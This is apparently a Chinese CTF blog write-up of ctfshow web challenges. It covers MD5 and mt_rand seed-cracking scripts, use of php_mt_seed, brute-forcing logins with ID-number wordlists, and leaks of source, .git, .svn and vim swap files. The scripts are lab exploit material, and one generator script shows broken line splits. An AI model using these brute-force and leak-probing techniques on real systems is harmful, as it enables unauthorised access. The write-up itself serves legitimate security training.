invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题考的是脚本编写，直接使用脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">dic = <span class="string">&#x27;0123456789qwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a in dic:</span><br><span class="line">    <span class="keyword">for</span> b in dic:</span><br><span class="line">        t = <span class="title function_ invoke__">str</span>(a) + <span class="title function_ invoke__">str</span>(b)</span><br><span class="line">        md5 = hashlib.<span class="title function_ invoke__">md5</span>(t.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">        <span class="comment"># print(md5)</span></span><br><span class="line">        <span class="comment"># print(md5[1:2])</span></span><br><span class="line">        <span class="comment"># print(md5[14:15])</span></span><br><span class="line">        <span class="comment"># print(md5[17:18])</span></span><br><span class="line">        <span class="keyword">if</span> md5[<span class="number">1</span>:<span class="number">2</span>] == md5[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> md5[<span class="number">14</span>:<span class="number">15</span>]== md5[<span class="number">17</span>:<span class="number">18</span>]:</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(md5[<span class="number">1</span>:<span class="number">2</span>])) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(md5[<span class="number">1</span>:<span class="number">2</span>]) &lt;= <span class="number">57</span> <span class="keyword">and</span> (<span class="title function_ invoke__">ord</span>(md5[<span class="number">14</span>:<span class="number">15</span>])) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(md5[<span class="number">14</span>:<span class="number">15</span>]) &lt;= <span class="number">57</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(md5[<span class="number">17</span>:<span class="number">18</span>])) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(md5[<span class="number">17</span>:<span class="number">18</span>]) &lt;= <span class="number">57</span> <span class="keyword">and</span> (<span class="title function_ invoke__">ord</span>(md5[<span class="number">31</span>:<span class="number">32</span>])) &gt;= <span class="number">48</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(</span><br><span class="line">                        md5[<span class="number">31</span>:<span class="number">32</span>]) &lt;= <span class="number">57</span>:</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">int</span>(md5[<span class="number">1</span>:<span class="number">2</span>]) + <span class="keyword">int</span>(md5[<span class="number">14</span>:<span class="number">15</span>]) + <span class="keyword">int</span>(md5[<span class="number">17</span>:<span class="number">18</span>])) / <span class="keyword">int</span>(md5[<span class="number">1</span>:<span class="number">2</span>]) == <span class="keyword">int</span>(md5[<span class="number">31</span>:<span class="number">32</span>]):</span><br><span class="line">                        <span class="keyword">print</span>(t)</span><br></pre></td></tr></table></figure><p>这里面我最开始写的时候没有12-14行，虽然会报错但是也能运行，wp中将其完善了一下。得到运行结果<code>3j</code><br>直接post传入即可得到flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677728759208-d504308e-6a04-47f2-a1ed-32f22148ac7c.png" alt="image.png"></p><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Q：这里为什么分别用ord和int：<br>A：int改变数据类型，外型不变；ord改变数据类型，值不改变：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677729322819-fdd917cf-96e9-440e-9537-4ecd5ca16fe9.png" alt="20180517204019346.png"></p><h1 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h1><blockquote><p>爆个🔨</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:26:39</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 13:53:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h2><p>代码中的<code>mt_srand()</code>为随机数生成器设定种子，可以之后调用随机数生成器，可以保证随机数生成的相同。所以这题很明确了，直接找到生成的随机数即可。<br>用PHPStorm找一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677830788193-57352fa8-4703-4b29-b7b6-6b8e4eeaa326.png" alt="image.png"><br>然后直接get传入即可：<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677830905489-9c6c4461-458d-4ca6-a1a2-9638ac7bf795.png" alt="image.png"></p><h1 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h1><blockquote></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>hexdec()</code>函数将十六进制转化为十进制。<br><del>猪脑过载了，开始打算写脚本跑出来第一个（第七行）的mt_rand()的值，但似乎直接给r传入0就行……</del><br>直接将r传入0，得到第一个mt_rand的值<code>1277101134</code>（即时生成的）。这时候，我们的目标就转化为尝试找到原种子的值。在搜索之后，发现有一个php_mt_seed的项目可以尝试破解出原种子的值。</p><h2 id="php-mt-seed"><a href="#php-mt-seed" class="headerlink" title="php_mt_seed"></a>php_mt_seed</h2><p>下载：<a href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a><br>下载之后直接在kali中解压中即可（可以使用windows，但是需要g++编译，因为之前没安装过）<br>解压之后需要先make一下生成文件（我这里刚刚更新过）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677839965380-57f4b720-0465-4dba-8c73-d7ace551f01b.png" alt="image.png"><br>然后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time ./php_mt_seed <span class="number">1277101134</span></span><br></pre></td></tr></table></figure><p>等待它找到seed。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677840306922-3ff2ae19-0589-40ec-93d8-516e45d2ee81.png" alt="image.png"><br>然后将生成的mt_rand()的结果相加：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="number">3352708826</span>, <span class="number">3352708827</span>, <span class="number">72059293</span>, <span class="number">379534775</span>, <span class="number">2177040484</span>, <span class="number">2437797623</span>, <span class="number">3102727756</span>, <span class="number">3907641824</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$f</span> = <span class="number">0</span>; <span class="variable">$f</span> &lt; <span class="number">11</span>; <span class="variable">$f</span>++)&#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$a</span>[<span class="variable">$f</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span> + <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677840379255-b1b12693-291d-4300-a0c8-4005848709f9.png" alt="image.png"><br>然后就是一个一个尝试进去得到flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677839267980-50ace50b-01b0-4096-b744-2d70dec7b52a.png" alt="image.png"></p><h1 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h1><p>上来就是连接数据库，但是似乎全为空的时候就连接成功了，应该是bug。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841398062-c31cda10-af2d-4736-8121-f604790b2cf7.png" alt="image.png"><br>爆破的话可能费点劲了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841574076-21b6d96c-5e80-4497-bd55-a7e4f7f0384c.png" alt="image.png"></p><h1 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h1><h2 id="方案一-1"><a href="#方案一-1" class="headerlink" title="方案一"></a>方案一</h2><p>这题有点意思，上来就是一个登陆页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841752959-36877d3f-2eca-42a6-b8e8-70ab983382da.png" alt="image.png"><br>下方有一个录取名单获取，下载一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677841938577-d558f1b0-499c-4b86-a062-0528b771ee58.png" alt="image.png"><br>网页中还有一个学籍管理系统，估计就是用这个来查找了，我们可以尝试爆破这个页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842002490-837a816c-6a10-4154-8a59-f4f2f9033cd3.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842443902-30f3d0b2-3f79-443d-afa2-ae744d5a6792.png" alt="image.png"><br>修改payload类型<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842468948-8d5e1435-2827-455c-b534-16d03b9b06a2.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842490721-bc38685b-9fc7-4cbf-a36c-a8951f791ee3.png" alt="image.png"><br>然后直接查询。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842525622-e75d02c1-6eb3-4b39-bc82-a824d5041a80.png" alt="image.png"><br>这下就得到了账号：02015237 密码：621022199002015237<br>返回去登陆页面。登录即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842624036-ffaab3b1-0968-4738-a3b2-4762e09e66c0.png" alt="image.png"></p><h2 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h2><p>wp提供的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//621022********5237</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;zid.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$year</span>=<span class="number">1990</span>;<span class="variable">$year</span>&lt;<span class="number">1993</span>;<span class="variable">$year</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$mon</span>=<span class="number">1</span>;<span class="variable">$mon</span>&lt;<span class="number">10</span>;<span class="variable">$mon</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$day</span>=<span class="number">01</span>;<span class="variable">$day</span>&lt;<span class="number">10</span>;<span class="variable">$day</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$txt</span>=(<span class="string">&#x27;621022&#x27;</span>.<span class="variable">$year</span>.<span class="string">&#x27;0&#x27;</span>.<span class="variable">$mon</span>.<span class="string">&#x27;0&#x27;</span>.<span class="variable">$day</span>.<span class="string">&#x27;5237&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; f</span><br><span class="line"><span class="keyword">or</span>(<span class="variable">$year</span>=<span class="number">1990</span>;<span class="variable">$year</span>&lt;<span class="number">1993</span>;<span class="variable">$year</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$mon</span>=<span class="number">1</span>;<span class="variable">$mon</span>&lt;<span class="number">10</span>;<span class="variable">$mon</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$day</span>=<span class="number">10</span>;<span class="variable">$day</span>&lt;=<span class="number">31</span>;<span class="variable">$day</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$txt</span>=(<span class="string">&#x27;621022&#x27;</span>.<span class="variable">$year</span>.<span class="string">&quot;0&quot;</span>.<span class="variable">$mon</span>.<span class="variable">$day</span>.<span class="string">&#x27;5237&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; f</span><br><span class="line"><span class="keyword">or</span>(<span class="variable">$year</span>=<span class="number">1990</span>;<span class="variable">$year</span>&lt;<span class="number">1993</span>;<span class="variable">$year</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$mon</span>=<span class="number">10</span>;<span class="variable">$mon</span>&lt;=<span class="number">12</span>;<span class="variable">$mon</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$day</span>=<span class="number">10</span>;<span class="variable">$day</span>&lt;=<span class="number">31</span>;<span class="variable">$day</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$txt</span>=(<span class="string">&#x27;621022&#x27;</span>.<span class="variable">$year</span>.<span class="variable">$mon</span>.<span class="variable">$day</span>.<span class="string">&#x27;5237&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; f</span><br><span class="line"><span class="keyword">or</span>(<span class="variable">$year</span>=<span class="number">1990</span>;<span class="variable">$year</span>&lt;<span class="number">1993</span>;<span class="variable">$year</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$mon</span>=<span class="number">10</span>;<span class="variable">$mon</span>&lt;=<span class="number">12</span>;<span class="variable">$mon</span>++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$day</span>=<span class="number">01</span>;<span class="variable">$day</span>&lt;<span class="number">10</span>;<span class="variable">$day</span>++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$txt</span>=(<span class="string">&#x27;621022&#x27;</span>.<span class="variable">$year</span>.<span class="variable">$mon</span>.<span class="string">&quot;0&quot;</span>.<span class="variable">$day</span>.<span class="string">&#x27;5237&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; f</span><br><span class="line"><span class="title function_ invoke__">close</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><h1 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h1><p>上来页面中什么也没有，但是注意到域名中有蹊跷：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677842814104-e64b62a2-3eca-40a7-86fb-7f2805ba5979.png" alt="image.png"><br>提示里面写了只用爆破目录即可，因此修改intruder。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677844522366-e4a15f61-248c-4cb6-a093-587a7d4381a4.png" alt="image.png"></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>他说的爆破目录修改的payload应该是：<code>/0/1/</code>而不是<code>/0/1</code>，后者会返回重定向301</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web1-20信息收集篇</title>
      <link href="/2023/03/13/web1-20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/"/>
      <url>/2023/03/13/web1-20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><blockquote><p>开发注释未及时删除</p></blockquote><p>直接f12源代码内存在flag</p><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><blockquote><p>js前台拦截 === 无效操作</p></blockquote><p>虽然禁止了右键和f12来打开开发者模式，但是chrome可以在更多工具中找到开发工具并打开。flag在源代码中。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677482893019-176e18a5-68f2-4408-8e72-8fbdacff4286.png" alt="image.png"></p><h2 id="others"><a href="#others" class="headerlink" title="others"></a>others</h2><p>看了wp之后发现还有几种方法：</p><ul><li>在url前面加上<code>view-source:</code></li><li>下载源码</li><li>在很短的时间内按f5和f12</li><li><code>ctrl + U</code>查看源代码</li><li>打开一个空白网页，然后按F12，接着再把网址复制进去并回车</li></ul><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><blockquote><p>没思路的时候抓个包看看，可能会有意外收获</p></blockquote><p>直接burpsuite抓包，返回包中在请求头中存在flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677483548818-27ec80b1-54a1-4dab-846c-caaf3559d6d1.png" alt="image.png"></p><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><blockquote><p>总有人把后台地址写入robots，帮黑阔大佬们引路。</p></blockquote><p>提示的已经很明显了，访问对应的反爬robots页面：<code>/robots.txt</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677483894393-32a3362c-c5f6-4237-b686-ce72a15d9d05.png" alt="image.png"><br>再次访问对应页面，得到flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677483939660-670394f2-b08d-4c8c-b197-afd1b1cc11f3.png" alt="image.png"></p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><blockquote><p>phps源码泄露有时候能帮上忙</p></blockquote><p>根据提示，这道题估计需要扫备份文件了。因此尝试去扫，但是换了好几个软件都没有扫到，看了wp，发现是：<code>index.phps</code>文件。<br>访问对应地址下载文件，可以看到flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677487363497-cfbb986a-e286-47d7-8034-1a70668ca14b.png" alt="image.png"></p><h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><blockquote><p>解压源码到当前目录，测试正常，收工</p></blockquote><p>一眼丁真，还是扫，继续扫。这个的目标文件是<code>www.zip</code>扫出来再解压打开即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677487513876-637eeffe-876d-4fa7-bfa7-171b5c25a78a.png" alt="image.png"></p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><blockquote><p>版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>根据提示可以判断出是git泄露的题目（扫也可以），直接访问git中的<code>index.php</code>文件，访问地址：<br><code>url/.git/index.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677487895563-63a6899d-9a87-46a6-9376-d5610eed2ea8.png" alt="image.png"></p><h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><blockquote><p>版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>除了git版本控制之外，这道题使用了svn控制版本。disreach扫描，发现有<code>.svn</code>泄露。因此我们直接访问：<code>url/.svn</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677488199030-63ba484d-0295-43c6-ae30-881cdee6af47.png" alt="image.png"></p><h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><blockquote><p>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p></blockquote><p>考察的是vim缓存泄露，即类似windows上编辑word文件，linux在vim编辑文件时也会产生缓存文件，如果像题目一样意外退出则会保存缓存文件。<br>以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn。<br>因此直接访问<code>url/index.php.swp</code>即可获取到文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677488692685-e9c7a051-b68e-4f1d-8382-f1083fbfc606.png" alt="image.png"></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>linux文件前面这个点指的是隐藏文件的意思，可能不需要加点也可以访问。</p><h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><blockquote><p>cookie 只是一块饼干，不能存放任何隐私数据</p></blockquote><p>根据题目，可以猜想可能是cookie里面藏东西了，因此尝试f12-网络监测：<br>在回传包中发现：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677489361977-d6445a0a-9884-4913-8885-8c470b582a18.png" alt="image.png"></p><h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><blockquote><p>域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息、</p></blockquote><h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><blockquote><p>有时候网站上的公开信息，就是管理员常用密码</p></blockquote><p>访问网站，访问<code>robots.txt</code>。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659086016-6482b784-18cc-4bd5-becd-347016c50a89.png" 